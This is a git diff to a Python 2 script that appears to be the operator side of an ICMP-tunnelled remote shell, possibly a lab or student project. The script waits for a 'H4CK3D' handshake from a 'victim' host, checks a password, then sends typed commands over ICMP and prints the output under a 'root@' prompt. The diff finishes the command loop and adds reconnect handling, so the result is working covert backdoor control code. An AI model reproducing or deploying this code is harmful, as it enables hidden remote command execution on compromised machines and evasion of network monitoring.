@@ -5,52 +5,52 @@
 "  ICMP messages can only be sent from processes running as root.
 """
 
-#   ops
-# Me sinto naqueles tutorial do yt meia boca anos 2000 KKKK
-
-
-# Entao pia: vou mostrar o enunciado pra vc, ai vc le ele em voz alta pra eu saber q acabou UHEUHEHU
-
 import os, sys, socket, struct, select, time, string, argparse, IN
 from ICMP_connection import ICMP
 
+#CHANGE HERE!
+host = "10.0.24.6"
 
+
+
+"""
+" Function to send the command typed to the victim and get the return
+"""
 def execute_commands(icmp_helper):
-    print "hello"
-    timeout = 20
-    while True:
+    timeout = 10
+    command = ""
+    while command != "exit":
         try:
-            # TODO: add pwd to string
-           command = raw_input("Command:")
-           print command
+           command = raw_input("root@" + icmp_helper.dest + " $")
            icmp_helper.send(command)
-           print "hello2"
            data = icmp_helper.receive(timeout)
+           if(secret_handshake in data):
+               icmp_helper.clearID()
+               print "the client has disconnected"
+               print "re-login..."
+               return 1
            print data
         except KeyboardInterrupt:
            break
-        # except Exception as ex:
-        #     template = "An exception of type {0} occurred. Arguments:\n{1!r}"
-        #     message = template.format(type(ex).__name__, ex.args)
-        #     print message
+    return 0
 
 
-
-
-host = "10.0.24.8"
-destination = "127.0.0.1"
-icmp_helper = ICMP(host, destination)
+# destination = "127.0.0.1"
+icmp_helper = ICMP(host, None)
 timeout = 10
+
+#for a real application it's better to use a bigger and more complex string :)
 secret_handshake = "H4CK3D"
-# Wait for connection from client
+
+# Wait connection from client
 print "Starting program..."
 print "Waiting for connection..."
-while True:
+keep_program_alive = 1
+while keep_program_alive:
     try:
         print "Expecting handshake"
         data = icmp_helper.receive(timeout)
-        print ""
-        print repr(data)
+        # print repr(data)
         try:
             if(secret_handshake in data):
                 password = raw_input("Enter the password:\n")
@@ -59,8 +59,7 @@ while True:
                 data = icmp_helper.receive(timeout)
                 if("OK" in data):
                     print "Connected!"
-                    # execute_commands(icmp_helper)
-                    exit()
+                    keep_program_alive = execute_commands(icmp_helper)
                 else:
                     print "Connection failed, wrong password."
             else:
@@ -69,13 +68,9 @@ while True:
             time.sleep(1)
         except KeyboardInterrupt:
             break
+        except TypeError:
+            print "Timeout..."
     except KeyboardInterrupt:
         break
 
-        # except Exception as ex:
-        #     icmp_helper.clearID()
-        #     template = "An exception of type {0} occurred. Arguments:\n{1!r}"
-        #     message = template.format(type(ex).__name__, ex.args)
-        #     print "Wrong data..."
-        #     print "Retrying.."
 icmp_helper.close()
